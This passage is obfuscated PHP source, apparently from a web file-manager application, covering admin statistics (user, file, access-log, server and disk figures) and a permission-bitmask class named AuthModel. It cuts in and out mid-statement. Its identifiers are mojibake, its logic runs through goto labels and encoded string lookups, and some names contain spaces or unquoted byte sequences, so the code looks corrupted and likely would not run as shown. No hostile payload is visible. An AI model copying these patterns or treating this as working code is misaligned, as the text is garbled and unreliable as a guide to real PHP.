array_to_keyvalue($AâÑ·ö†İ‹, $E°—éìÜ§[222]); foreach ($AÜ÷²áƒÌ as $Bˆ²²ÕÁ¶Ê) { if (isset($F–¯†ø·¤Œ[$Bˆ²²ÕÁ¶Ê])) { $c’±Ï‡É« = $F–¯†ø·¤Œ[$Bˆ²²ÕÁ¶Ê]; } else { $c’±Ï‡É« = end($AâÑ·ö†İ‹); $c’±Ï‡É«[$E°—éìÜ§[222]] = $Bˆ²²ÕÁ¶Ê; if ($A±îñ¨œğ == $E°—éìÜ§[588]) { $c’±Ï‡É«[$E°—éìÜ§[1660]] = $c’±Ï‡É«[$E°—éìÜ§[1661]] = 0; } } $AèÓŒ«³™”[] = $c’±Ï‡É«; } $AâÑ·ö†İ‹ = $AèÓŒ«³™”; } $aÎ÷‚ôßÈ = array($E°—éìÜ§[588] => array($E°—éìÜ§[760] => LNG($E°—éìÜ§[1676]), $E°—éìÜ§[1660] => LNG($E°—éìÜ§[1677]), $E°—éìÜ§[1661] => LNG($E°—éìÜ§[1678])), $E°—éìÜ§[1662] => array($E°—éìÜ§[758] => LNG($E°—éìÜ§[1679]), $E°—éìÜ§[1664] => LNG($E°—éìÜ§[1680]), $E°—éìÜ§[1665] => LNG($E°—éìÜ§[1681]), $E°—éìÜ§[1666] => LNG($E°—éìÜ§[1682]))); $bèÀÛèî“´ = array($E°—éìÜ§[588] => $E°—éìÜ§[1683], $E°—éìÜ§[1662] => $E°—éìÜ§[78]); goto fç¼·ëæ‹Ò; eÔ¡áÍóÒ: } public function validDate($dëæ³¸§ôœ, $CÑÀ½ì¾Š„) { goto A¬Ó¹ëˆ¢; C “ƒÅ†Öñ: return $bøì¿®¢†ƒ; goto bŒä­‹ù¥Š; A¬Ó¹ëˆ¢: $fâÒ¦¢Ï¼É =& $_SERVER[›é¼±]; $E©’”—Ç¨À = date($fâÒ¦¢Ï¼É[1667], strtotime($fâÒ¦¢Ï¼É[1668])); $bøì¿®¢†ƒ = array($E©’”—Ç¨À); goto DÇàßß›°Â; DÇàßß›°Â: switch ($dëæ³¸§ôœ) { case $fâÒ¦¢Ï¼É[1544]: $c—¤Ì‡ëî = mktime(0, 0, 0, date($fâÒ¦¢Ï¼É[1684]), date($fâÒ¦¢Ï¼É[1286]) - date($fâÒ¦¢Ï¼É[1347]) + 7 - 7, date($fâÒ¦¢Ï¼É[1685])); $e‹ÏÓæÏÛÆ = 0; do { $d™Â’ßÆí = date($fâÒ¦¢Ï¼É[1667], $c—¤Ì‡ëî - 3600 * 24 * 7 * $e‹ÏÓæÏÛÆ); $bøì¿®¢†ƒ[] = $d™Â’ßÆí; $e‹ÏÓæÏÛÆ++; } while ($CÑÀ½ì¾Š„ < $d™Â’ßÆí); break; case $fâÒ¦¢Ï¼É[1542]: $e‹ÏÓæÏÛÆ = 1; do { $aÖ¤”™¡¼„ = date($fâÒ¦¢Ï¼É[1686], strtotime("\x2d\x20{$e‹ÏÓæÏÛÆ}\x20\x6d\157\156\x74\150\x73")); $bøì¿®¢†ƒ[] = $aÖ¤”™¡¼„; $e‹ÏÓæÏÛÆ++; } while ($CÑÀ½ì¾Š„ < $aÖ¤”™¡¼„); break; case $fâÒ¦¢Ï¼É[1687]: $FÖŸÎ‹£©Ó = (int) date($fâÒ¦¢Ï¼É[1685], strtotime($CÑÀ½ì¾Š„)); $E¾§¼†Àå¿ = (int) date($fâÒ¦¢Ï¼É[1685]); if ($FÖŸÎ‹£©Ó >= $E¾§¼†Àå¿) { break; } for ($FÖŸÎ‹£©Ó; $FÖŸÎ‹£©Ó < $E¾§¼†Àå¿; $FÖŸÎ‹£©Ó++) { $bøì¿®¢†ƒ[] = $FÖŸÎ‹£©Ó . $fâÒ¦¢Ï¼É[1688]; } break; default: break; } if ($CÑÀ½ì¾Š„ > end($bøì¿®¢†ƒ)) { array_pop($bøì¿®¢†ƒ); } sort($bøì¿®¢†ƒ); goto C “ƒÅ†Öñ; bŒä­‹ù¥Š: } public function listTable($f½ƒÜÎåØŒ) { $bÅ¾¥‘ò´ï = ucfirst($f½ƒÜÎåØŒ); return Model($bÅ¾¥‘ò´ï)->listData(); } public function option($FË”‡×çã») { $AÖŸ ãè—… = $_SERVER[›é¼±][1689] . ucfirst($FË”‡×çã»); return $this->{$AÖŸ ãè—…}(); } private function optionUser() { goto fõëŸË¤á¸; fõëŸË¤á¸: $eÉ˜õéÄĞ =& $_SERVER[›é¼±]; $dÚ§ ­©ë‹ = Model($eÉ˜õéÄĞ[532])->count($eÉ˜õéÄĞ[1564]); $eâ·§Æ†¬÷ = Model($eÉ˜õéÄĞ[532])->where($eÉ˜õéÄĞ[1690])->count($eÉ˜õéÄĞ[1564]); goto Dó‰“Éµ; B„ç’åšÎƒ: if ($BÈ‚Â¬çÜˆ < $F×š£Š´†ë) { $BÈ‚Â¬çÜˆ = $F×š£Š´†ë; } $b¨ã Áøï = array($eÉ˜õéÄĞ[1691] => array($eÉ˜õéÄĞ[1006], $BÈ‚Â¬çÜˆ)); $d«Á’è˜ŞŒ = (int) Model($eÉ˜õéÄĞ[532])->where($b¨ã Áøï)->count($eÉ˜õéÄĞ[1564]); goto A®‚ÁÒÄÛ”; Dó‰“Éµ: $c­Ï°ˆƒÈñ = intval($GLOBALS[$eÉ˜õéÄĞ[6]][$eÉ˜õéÄĞ[347]][$eÉ˜õéÄĞ[1523]]) / 3600; $BÈ‚Â¬çÜˆ = strtotime("\x2d{$c­Ï°ˆƒÈñ}\x20\x68\157\165\x72\x73"); $F×š£Š´†ë = strtotime(date($eÉ˜õéÄĞ[1671])); goto B„ç’åšÎƒ; A®‚ÁÒÄÛ”: if (!$d«Á’è˜ŞŒ) { $d«Á’è˜ŞŒ = 1; } $b¨ã Áøï = array($eÉ˜õéÄĞ[1691] => array($eÉ˜õéÄĞ[1006], $F×š£Š´†ë)); $CÆ¦ÇŸ¬æ¾ = Model($eÉ˜õéÄĞ[532])->where($b¨ã Áøï)->count($eÉ˜õéÄĞ[1564]); goto CÉ¡åÛ´ÂÖ; CÉ¡åÛ´ÂÖ: return array($eÉ˜õéÄĞ[754] => (int) $dÚ§ ­©ë‹, $eÉ˜õéÄĞ[1692] => (int) ($dÚ§ ­©ë‹ - $eâ·§Æ†¬÷), $eÉ˜õéÄĞ[1693] => (int) $eâ·§Æ†¬÷, $eÉ˜õéÄĞ[1694] => (int) $CÆ¦ÇŸ¬æ¾, $eÉ˜õéÄĞ[1695] => $d«Á’è˜ŞŒ); goto fÜ‡ß¦„ª; fÜ‡ß¦„ª: } private function optionFile() { goto bŸö¬‘¦¬¿; Fàî˜ÒÇÃí: $bä£¨”Ñğ½ = Model($A™•ì»ïË¯[827])->where($cÇÙõ‘µô)->sum($A™•ì»ïË¯[78]); $bƒÜ„Ê£Â = Model($A™•ì»ïË¯[827])->where($cÇÙõ‘µô)->count($A™•ì»ïË¯[397]); return array($A™•ì»ïË¯[758] => $DóÅÑĞÅŸÛ, $A™•ì»ïË¯[1664] => $E±È…Àó„, $A™•ì»ïË¯[1696] => $DóÅÑĞÅŸÛ - $E±È…Àó„, $A™•ì»ïË¯[1697] => (int) $bä£¨”Ñğ½, $A™•ì»ïË¯[760] => (int) $d¸¦­±’õÁ, $A™•ì»ïË¯[1698] => (int) $bƒÜ„Ê£Â); goto DĞ¢ğÔ´â; bŸö¬‘¦¬¿: $A™•ì»ïË¯ =& $_SERVER[›é¼±]; $f¿–Ú´ôÂ² = $this->sourceSize(); $DóÅÑĞÅŸÛ = $f¿–Ú´ôÂ²[$A™•ì»ïË¯[78]]; goto D”ôå‰Ú‚; D”ôå‰Ú‚: $E±È…Àó„ = $f¿–Ú´ôÂ²[$A™•ì»ïË¯[1664]]; $d¸¦­±’õÁ = Model($A™•ì»ïË¯[827])->where(array($A™•ì»ïË¯[405] => 0))->count($A™•ì»ïË¯[397]); $cÇÙõ‘µô = array($A™•ì»ïË¯[405] => 0, $A™•ì»ïË¯[194] => array($A™•ì»ïË¯[1006], strtotime(date($A™•ì»ïË¯[1671])))); goto Fàî˜ÒÇÃí; DĞ¢ğÔ´â: } private function optionAccess() { $E­ÈİòÕÅ½ =& $_SERVER[›é¼±]; return array($E­ÈİòÕÅ½[754] => $this->typeLogCnt(), $E­ÈİòÕÅ½[107] => $this->typeLogCnt($E­ÈİòÕÅ½[107]), $E­ÈİòÕÅ½[444] => $this->typeLogCnt($E­ÈİòÕÅ½[444]), $E­ÈİòÕÅ½[1699] => $this->typeLogCnt($E­ÈİòÕÅ½[1699]), $E­ÈİòÕÅ½[1700] => $this->typeLogCnt($E­ÈİòÕÅ½[1700]), $E­ÈİòÕÅ½[588] => $this->typeLogCnt($E­ÈİòÕÅ½[33], $E­ÈİòÕÅ½[1675])); } private function typeLogCnt($d¼¶îÔºù = '', $c‡»¢ì¯Î¶ = "\x69\x64") { goto bİÌ©ƒÜ“; bİÌ©ƒÜ“: $fŸŠ„—òµß =& $_SERVER[›é¼±]; $FÈ¾¡È½Õé = array($fŸŠ„—òµß[107] => array($fŸŠ„—òµß[1701], $fŸŠ„—òµß[1702]), $fŸŠ„—òµß[444] => array($fŸŠ„—òµß[1703], $fŸŠ„—òµß[1704]), $fŸŠ„—òµß[1699] => array($fŸŠ„—òµß[1705], $fŸŠ„—òµß[1706], $fŸŠ„—òµß[1707]), $fŸŠ„—òµß[1700] => array($fŸŠ„—òµß[1708], $fŸŠ„—òµß[1709]), $fŸŠ„—òµß[1710] => array($fŸŠ„—òµß[1711], $fŸŠ„—òµß[1712], $fŸŠ„—òµß[1713])); $fçê‡¿ƒˆ = strtotime(date($fŸŠ„—òµß[1671])); goto cåÄÃƒç™³; cåÄÃƒç™³: $fÓÈœö‚½¥ = array($fŸŠ„—òµß[194] => array($fŸŠ„—òµß[1006], $fçê‡¿ƒˆ)); if ($d¼¶îÔºù) { $fÓÈœö‚½¥[$fŸŠ„—òµß[29]] = array($fŸŠ„—òµß[7], $FÈ¾¡È½Õé[$d¼¶îÔºù]); } $cƒ¥Ì‹ã”± = Model($fŸŠ„—òµß[1674])->where($fÓÈœö‚½¥)->count($c‡»¢ì¯Î¶); goto B’ËË‹ŞËî; B’ËË‹ŞËî: return (int) $cƒ¥Ì‹ã”±; goto AÒÒ¹ãŞ™´; AÒÒ¹ãŞ™´: } private function optionServer() { goto AË¨ÌíêåÎ; A×â†Ë‰œÌ: $aæ©Ø‹ ¼¼ = $F«‚¶òËÎ[0]; $aŞ“—èßåª = $GLOBALS[$fßŠÖÚ˜Šà[6]][$fßŠÖÚ˜Šà[17]]; $C×·¢šÃŞ = $aŞ“—èßåª[$fßŠÖÚ˜Šà[967]]; goto B¶ÇŒ¼Æ…˜; Aò¢“§‰: return array($fßŠÖÚ˜Šà[1716] => $cŠ³´Ÿ˜µ³ ? $cŠ³´Ÿ˜µ³[$fßŠÖÚ˜Šà[1717]] : 0, $fßŠÖÚ˜Šà[1718] => $cŠ³´Ÿ˜µ³ ? $cŠ³´Ÿ˜µ³[$fßŠÖÚ˜Šà[1719]] : 0, $fßŠÖÚ˜Šà[1720] => (int) $F˜ƒ°Â ä“[$fßŠÖÚ˜Šà[1717]] * 1024 * 1024 * 1024, $fßŠÖÚ˜Šà[1721] => (int) $cÉ¡ÛŸ¶¯³, $fßŠÖÚ˜Šà[1722] => ucfirst($aæ©Ø‹ ¼¼), $fßŠÖÚ˜Šà[1723] => $fßŠÖÚ˜Šà[1724] . PHP_VERSION, $fßŠÖÚ˜Šà[1725] => phpBuild64() ? 64 : 32, $fßŠÖÚ˜Šà[753] => str_replace($fßŠÖÚ˜Šà[1726], $fßŠÖÚ˜Šà[983], $C×·¢šÃŞ), $fßŠÖÚ˜Šà[347] => ucfirst($aøŒ¤‰¾®‰), $fßŠÖÚ˜Šà[28] => $_SERVER[$fßŠÖÚ˜Šà[1727]]); goto a—Ã•—ù; B¶ÇŒ¼Æ…˜: if ($C×·¢šÃŞ == $fßŠÖÚ˜Šà[792]) { $eÍ¤‡®ã…Ö = explode($fßŠÖÚ˜Šà[1200], $aŞ“—èßåª[$fßŠÖÚ˜Šà[966]]); $C×·¢šÃŞ = $eÍ¤‡®ã…Ö[0]; } if ($C×·¢šÃŞ == $fßŠÖÚ˜Šà[795] || $C×·¢šÃŞ == $fßŠÖÚ˜Šà[796]) { $bĞ¡¿éÜ¦ = Model()->db()->query($fßŠÖÚ˜Šà[1714]); $EÄåŒª¸æ¨ = $bĞ¡¿éÜ¦[0] && isset($bĞ¡¿éÜ¦[0][$fßŠÖÚ˜Šà[1463]]) ? $bĞ¡¿éÜ¦[0][$fßŠÖÚ˜Šà[1463]] : 0; $C×·¢šÃŞ = $fßŠÖÚ˜Šà[1715] . ($EÄåŒª¸æ¨ ? $fßŠÖÚ˜Šà[8] . $EÄåŒª¸æ¨ : $fßŠÖÚ˜Šà[33]); } $aøŒ¤‰¾®‰ = $GLOBALS[$fßŠÖÚ˜Šà[6]][$fßŠÖÚ˜Šà[347]][$fßŠÖÚ˜Šà[829]]; goto Aò¢“§‰; fƒø…»§Áº: $bÏÎ²‚ïÊÃ = array($fßŠÖÚ˜Šà[819] => $F˜ƒ°Â ä“[$fßŠÖÚ˜Šà[395]]); $cÉ¡ÛŸ¶¯³ = Model($fßŠÖÚ˜Šà[464])->where($bÏÎ²‚ïÊÃ)->sum($fßŠÖÚ˜Šà[78]); $F«‚¶òËÎ = explode($fßŠÖÚ˜Šà[50], $_SERVER[$fßŠÖÚ˜Šà[142]]); goto A×â†Ë‰œÌ; AË¨ÌíêåÎ: $fßŠÖÚ˜Šà =& $_SERVER[›é¼±]; $cŠ³´Ÿ˜µ³ = $this->diskDriver(); $F˜ƒ°Â ä“ = KodIO::defaultDriver(); goto fƒø…»§Áº; a—Ã•—ù: } private function diskDriver() { goto AÏãçÀ¸¿š; F¥ğÜ•œ£É: if ($A«Î¯¿¹ë) { $d×á‘·ªÀ¨ = $Cˆå×ÌÇ ­[1730]; if (function_exists($Cˆå×ÌÇ ­[1731])) { exec($Cˆå×ÌÇ ­[1732], $ağ˜™‚²ì); $d×á‘·ªÀ¨ = $ağ˜™‚²ì[1] . $Cˆå×ÌÇ ­[8]; } } if (!file_exists($d×á‘·ªÀ¨)) { return; } $FÊÍê×ª = @disk_total_space($d×á‘·ªÀ¨); goto fÀ·îµ˜”Û; fÀ·îµ˜”Û: $fÕ‡‰ÕÆÏŠ = $FÊÍê×ª - @disk_free_space($d×á‘·ªÀ¨); return array($Cˆå×ÌÇ ­[1717] => $FÊÍê×ª, $Cˆå×ÌÇ ­[1719] => $fÕ‡‰ÕÆÏŠ); goto AŸ¿å³ë‚Ş; AÏãçÀ¸¿š: $Cˆå×ÌÇ ­ =& $_SERVER[›é¼±]; $d×á‘·ªÀ¨ = $Cˆå×ÌÇ ­[8]; $A«Î¯¿¹ë = $GLOBALS[$Cˆå×ÌÇ ­[6]][$Cˆå×ÌÇ ­[1728]] == $Cˆå×ÌÇ ­[1729]; goto F¥ğÜ•œ£É; AŸ¿å³ë‚Ş: } public function fileChart($AË²÷ù…óÃ) { goto b§Àå¾ÇÈ; b§Àå¾ÇÈ: $E±©…ˆ¸œÄ =& $_SERVER[›é¼±]; if (isset($AË²÷ù…óÃ[$E±©…ˆ¸œÄ[1564]])) { return Model($E±©…ˆ¸œÄ[827])->userFileTypeProfile($AË²÷ù…óÃ[$E±©…ˆ¸œÄ[1564]]); } if (isset($AË²÷ù…óÃ[$E±©…ˆ¸œÄ[1733]])) { return Model($E±©…ˆ¸œÄ[827])->groupFileTypeProfile($AË²÷ù…óÃ[$E±©…ˆ¸œÄ[1733]]); } goto a…Ó©°Íğµ; Fà³¢¹†õ: $cË’ÁØƒ¯[$E±©…ˆ¸œÄ[406]] = 2; $Fç”†ÄáÓ = Model($E±©…ˆ¸œÄ[827])->where($cË’ÁØƒ¯)->sum($E±©…ˆ¸œÄ[78]); return array($E±©…ˆ¸œÄ[758] => $fç††¦”‹[$E±©…ˆ¸œÄ[78]], $E±©…ˆ¸œÄ[1664] => $fç††¦”‹[$E±©…ˆ¸œÄ[1664]], $E±©…ˆ¸œÄ[1665] => (int) $A½¹´“å, $E±©…ˆ¸œÄ[1666] => (int) $Fç”†ÄáÓ); goto F‡ÉÃŠ—í; a…Ó©°Íğµ: $fç††¦”‹ = $this->sourceSize(); $cË’ÁØƒ¯ = array($E±©…ˆ¸œÄ[492] => 0, $E±©…ˆ¸œÄ[406] => 1); $A½¹´“å = Model($E±©…ˆ¸œÄ[827])->where($cË’ÁØƒ¯)->sum($E±©…ˆ¸œÄ[78]); goto Fà³¢¹†õ; F‡ÉÃŠ—í: } private function sourceSize() { $fğÀÓÚË­å =& $_SERVER[›é¼±]; $c®”Ü àíù = Model($fğÀÓÚË­å[827])->where(array($fğÀÓÚË­å[405] => 0))->sum($fğÀÓÚË­å[78]); $FãÕ×Ÿ¢Æ° = Model($fğÀÓÚË­å[464])->sum($fğÀÓÚË­å[78]); if ($FãÕ×Ÿ¢Æ° > $c®”Ü àíù) { $FãÕ×Ÿ¢Æ° = $c®”Ü àíù; } return array($fğÀÓÚË­å[78] => (int) $c®”Ü àíù, $fğÀÓÚË­å[1664] => (int) $FãÕ×Ÿ¢Æ°); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $eĞëµ¤É¾ä =& $_SERVER[›é¼±]; $D‘•ø¡Â = array(array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1734]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1736], $eĞëµ¤É¾ä[1737] => 1, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1740]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1741], $eĞëµ¤É¾ä[1737] => 2, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1742]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1743], $eĞëµ¤É¾ä[1737] => 3, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1744]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1745], $eĞëµ¤É¾ä[1737] => 4, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => self::AUTH_SHOW | self::AUTH_VIEW), array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1746]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1747], $eĞëµ¤É¾ä[1737] => 5, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1748]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1749], $eĞëµ¤É¾ä[1737] => 6, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($eĞëµ¤É¾ä[415] => LNG($eĞëµ¤É¾ä[1750]), $eĞëµ¤É¾ä[1735] => $eĞëµ¤É¾ä[1751], $eĞëµ¤É¾ä[1737] => 7, $eĞëµ¤É¾ä[1738] => 1, $eĞëµ¤É¾ä[1739] => 0)); return $D‘•ø¡Â; } public static function authCheck($dâ¬»¸ÒĞ, $AïÔç¡ÁÌ) { $dâ¬»¸ÒĞ = intval($dâ¬»¸ÒĞ); if ($GLOBALS[$_SERVER[›é¼±][499]]) { return !0; } if ($dâ¬»¸ÒĞ <= 0) { return !1; } if (($dâ¬»¸ÒĞ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dâ¬»¸ÒĞ & $AïÔç¡ÁÌ); } public static function authCheckShow($BãâÊ¥öÊÇ) { return self::authCheck($BãâÊ¥öÊÇ, self::AUTH_SHOW); } public static function authCheckView($Eã‘à·«Â) { return self::authCheck($Eã‘à·«Â, self::AUTH_VIEW); } public static function authCheckDownload($fÕ‘¢‰ô¿”) { return self::authCheck($fÕ‘¢‰ô¿”, self::AUTH_DOWNLOAD); } public static function authCheckUpload($BŒéã–ÇˆÌ) { return self::authCheck($BŒéã–ÇˆÌ, self::AUTH_UPLOAD); } public static function authCheckEdit($cë¤è³©ŒÔ) { return self::authCheck($cë¤è³©ŒÔ, self::AUTH_EDIT); } public static function authCheckRemove($d…Ë°Èèé) { return self::authCheck($d…Ë°Èèé, self::AUTH_REMOVE); } public static function authCheckShare($f™¤×Œ½˜©) { return self::authCheck($f™¤×Œ½˜©, self::AUTH_SHARE); } public static function authCheckComment($AŸîŒì ê•) { return self::authCheck($AŸîŒì ê•, self::AUTH_COMMENT); } public static function authCheckEvent($C„¡ÇÏ†µë) { return self::authCheck($C„¡ÇÏ†µë, self::AUTH_EVENT); } public static function authCheckRoot($cŠ†ïòÇ—”) { return self::authCheck($cŠ†ïòÇ—”, self::AUTH_ROOT); } public static function authCheckAction($cœßº½ÚÅ, $E…­³ÏØ¥) { goto A˜ºÍõ´öÀ; A˜ºÍõ´öÀ: $Cù§·Â¾¾ñ =& $_SERVER[›é¼±]; $Eå„°áï¬Ø = array($Cù§·Â¾¾ñ[1752] => self::AUTH_VIEW, $Cù§·Â¾¾ñ[1127] => self::AUTH_DOWNLOAD, $Cù§·Â¾¾ñ[107] => self::AUTH_UPLOAD, $Cù§·Â¾¾ñ[1700] => self::AUTH_EDIT, $Cù§·Â¾¾ñ[1699] => self::AUTH_REMOVE, $Cù§·Â¾¾ñ[1710] => self::AUTH_SHARE, $Cù§·Â¾¾ñ[352] => self::AUTH_COMMENT, $Cù§·Â¾¾ñ[1552] => self::AUTH_EVENT, $Cù§·Â¾¾ñ[1753] => self::AUTH_ROOT); if (!isset($Eå„°áï¬Ø[$E…­³ÏØ¥])) { return; } goto fˆ™Ï§Å½Å; a§ù¯•Œ¼ô: if (($cœßº½ÚÅ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($cœßº½ÚÅ & $FŒ„’â¨Ûç); goto F™Å¹ñİ–; fˆ™Ï§Å½Å: $FŒ„’â¨Ûç = $Eå„°áï¬Ø[$E…­³ÏØ¥]; $cœßº½ÚÅ = intval($cœßº½ÚÅ); if ($cœßº½ÚÅ <= 0) { return !1; } goto a§ù¯•Œ¼ô; F™Å¹ñİ–: } public static function authDisable($b‚Œø²ç¬¢, $d¶ğ‹‹–¤ñ) { if (intval($b‚Œø²ç¬¢) <= 0) { return 0; } return intval($b‚Œø²ç¬¢) & ~$d¶ğ‹‹–¤ñ; } public $optionType = "\x53\171\x73\x74\145\155\56\163\157\x75\162\x63\x65\x41\x75\164\x68\114\x69\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x61\x75\x74\150", "\x6c\x61\x62\x65\x6c", "\x64\151\x73\x70\154\x61\x79", "\x73\171\x73\x74\x65\155", "\163\x6f\162\164"); public function initData() { $CŸàëŸ³µá = $this->authDefault(); foreach ($CŸàëŸ³µá as $Aâ«ùôÑ¢) { $this->add($Aâ«ùôÑ¢); } } public function findAuth($d±Ú¡±×ÙÁ, $dËÕÙÓâ¬«) { $fõè‘ÑÙèŠ =& $_SERVER[›é¼±]; $CÉ¹„–×—‘ = parent::listData(); foreach ($CÉ¹„–×—‘ as $B›¥Œºìæ¼) { $Aµ›¨Ç×÷¿ = intval($B›¥Œºìæ¼[$fõè‘ÑÙèŠ[408]]); if ($Aµ›¨Ç×÷¿ <= 0 || $B›¥Œºìæ¼[$fõè‘ÑÙèŠ[1754]] == 0) { continue; } if (($Aµ›¨Ç×÷¿ & $d±Ú¡±×ÙÁ) != $d±Ú¡±×ÙÁ) { continue; } if (($Aµ›¨Ç×÷¿ & $dËÕÙÓâ¬«) != 0) { continue; } return $B›¥Œºìæ¼[$fõè‘ÑÙèŠ[395]]; } return !1; } public function findAuthReadOnly() { $a»…ÆÕÕˆÑ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $F …öåğÃ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($a»…ÆÕÕˆÑ, $F …öåğÃ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($D”ÀÛã¶©Î = false, $b™„ãÂÀ© = "\x73\157\x72\164", $B…¥â±¨®Ç = false) { return parent::listData($D”ÀÛã¶©Î, $b™„ãÂÀ©, $B…¥â±¨®Ç); } public function update($E·Ø´´Â™é, $F‹í¼…‚âß) { $Aöæçİ Ï =& $_SERVER[›é¼±]; $A¨…¶ÄÔã± = parent::listData($E·Ø´´Â™é); $dÈ¹Ü˜ŒË = $this->findByName($F‹í¼…‚âß[$Aöæçİ Ï[28]]); if (!$A¨…¶ÄÔã± || $dÈ¹Ü˜ŒË && $dÈ¹Ü˜ŒË[$Aöæçİ Ï[395]] != $A¨…¶ÄÔã±[$Aöæçİ Ï[395]]) { return !1; } $this->filterAuth($F‹í¼…‚âß[$Aöæçİ Ï[408]]); return parent::update($E·Ø´´Â™é, $F‹í¼…‚âß); } public function remove($F«Üæ‚¼İ) { $a²Ñˆ‡Â‰  = parent::listData($F«Üæ‚¼İ); if (!$a²Ñˆ‡Â‰  || $a²Ñˆ‡Â‰ [$_SERVER[›é¼±][1204]]) { return !1; } return parent::remove($F«Üæ‚¼İ); } public function add($cí§Ğçëšé = array()) { goto e’»•¢²; fÂõ¼ªÚ: $cí§Ğçëšé = array_merge($E˜¤‘¨ÏÎš, $cí§Ğçëšé); $cí§Ğçëšé[$Aç¦İÑ¦©Ú[1756]] = $this->getSort(); $this->filterAuth($cí§Ğçëšé[$Aç¦İÑ¦©Ú[408]]); goto còáˆ«‰ˆ; e’»•¢²: $Aç¦İÑ¦©Ú =& $_SERVER[›é¼±]; if ($this->findByName($cí§Ğçëšé[$Aç¦İÑ¦©Ú[28]])) { return !1; } $E˜¤‘¨ÏÎš = array($Aç¦İÑ¦©Ú[28] => $Aç¦İÑ¦©Ú[33], $Aç¦İÑ¦©Ú[408] => 1, $Aç¦İÑ¦©Ú[1755] => $Aç¦İÑ¦©Ú[1743], $Aç¦İÑ¦©Ú[1754] => 1, $Aç¦İÑ¦©Ú[1204] => 0, $Aç¦İÑ¦©Ú[1756] => 0); goto fÂõ¼ªÚ; còáˆ«‰ˆ: return parent::insert($cí§Ğçëšé); goto BÁ¤ÑƒÇ´; BÁ¤ÑƒÇ´: } private function getSort() { $dì¬öó„ä =& $_SERVER[›é¼±]; $dåÅ£–’Ñ = parent::listData(); $f¨ßÙ‰Áõ¬ = array_to_keyvalue($dåÅ£–’Ñ, $dì¬öó„ä[33], $dì¬öó„ä[1756]); return empty($f¨ßÙ‰Áõ¬) ? 0 : max($f¨ßÙ‰Áõ¬) + 1; } private function filterAuth(&$C—Ø»›ò®Ÿ) { goto böŒÇÄ»; böŒÇÄ»: if (!$C—Ø»›ò®Ÿ) { return; } $CÇ–ÎÁ“  = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $eª¯èÄÑ‰ = array(); goto e–ÈÊ¾ô¬ç; e–ÈÊ¾ô¬ç: foreach ($CÇ–ÎÁ“  as $Dê‹ç—ç±) { if ($C—Ø»›ò®Ÿ & $Dê‹ç—ç±) { $eª¯èÄÑ‰[] = $Dê‹ç—ç±; } } if (in_array(self::AUTH_ROOT, $eª¯èÄÑ‰)) { $C—Ø»›ò®Ÿ = array_sum($CÇ–ÎÁ“ ); return; } $dÄŞ„´Š…® = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto BØÌ˜ïŠì; BØÌ˜ïŠì: foreach ($eª¯èÄÑ‰ as $Dê‹ç—ç±) { if (isset($dÄŞ„´Š…®[$Dê‹ç—ç±])) { $eª¯èÄÑ‰ = array_merge($eª¯èÄÑ‰, 